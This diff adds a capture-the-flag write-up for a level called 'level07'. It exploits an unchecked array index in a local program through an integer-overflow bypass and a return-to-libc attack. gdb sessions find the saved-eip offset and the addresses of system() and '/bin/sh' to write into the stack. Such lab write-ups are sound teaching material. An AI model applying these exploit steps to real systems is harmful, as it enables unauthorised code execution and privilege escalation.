@@ -1,0 +1,79 @@
+The program allows us to read and write data in an array,
+but no checks are done to verify that we don't write outside of the array.
+
+We can then override the eip pointer, and do a ret to libc attack.
+
+For this we will need to know the adress of the eip in the stack
+relative to the adress of the buffer array, as we will only be able to access it through
+the store and read instructions of the program.
+
+Find the adress of the array:
+
+gdb level07
+(gdb) b *0x0804884f (main + 300, before reading the instruction)
+(gdb) r
+(gdb) x 0x24 + $esp (0x24(%esp) is the adress of the array)
+0xffffd554:     0x00000000
+
+The array is at 0xffffd554
+(it might change between multiple runs, but we only need to know the offset between the array and the eip, which doesnt change)
+
+Find the adress of eip:
+(gdb) info frame
+Stack level 0, frame at 0xffffd720:
+ eip = 0x804884f in main; saved eip 0xf7e45513
+ Arglist at 0xffffd718, args:
+ Locals at 0xffffd718, Previous frame's sp is 0xffffd720
+ Saved registers:
+  ebx at 0xffffd70c, ebp at 0xffffd718, esi at 0xffffd710, edi at 0xffffd714,
+  eip at 0xffffd71c
+
+eip is at 0xffffd71c.
+
+(0xffffd71c - 0xffffd554) / 4 = 114 (divide by 4 because it is an array of unsigned int, so all pointer arithmetics are multiplied by 4, we can see it in assembly with the shift left by 2)
+
+So writing in the array at adress 114 should override the eip
+But if we try it directly we see that the index 114 is protected, indeed every 3rd index is reserved for wil!
+We can bypass this restriction by causing an int overflow, as i said earlier all the indexes are multiplied by 4
+(0xffffffff + 1) / 4 + 114 = 1073741938
+
+So 1073741938 * 4 should be equivalent to 114, let's try it:
+Input command: store
+ Number: 42424242
+ Index: 1073741938
+ Completed store command successfully
+
+Input command: read
+ Index: 114
+ Number at data[114] is 42424242
+ Completed read command successfully
+
+it seems OK, let's quit to see if the eip has been overriden:
+
+Input command: quit
+
+Program received signal SIGSEGV, Segmentation fault.
+0x028757b2 in ?? ()
+
+0x028757b2 in decimal is 42424242, it worked.
+
+Now let's find the adress of the system() function:
+
+(gdb) info func system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+
+the adress of system() is 0xf7e6aed0, 4159090384 in decimal.
+
+Let's find the adress of "/bin/sh" function:
+
+(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+in decimal it is 4160264172
+We need to put it at the index 116 in the array.
+
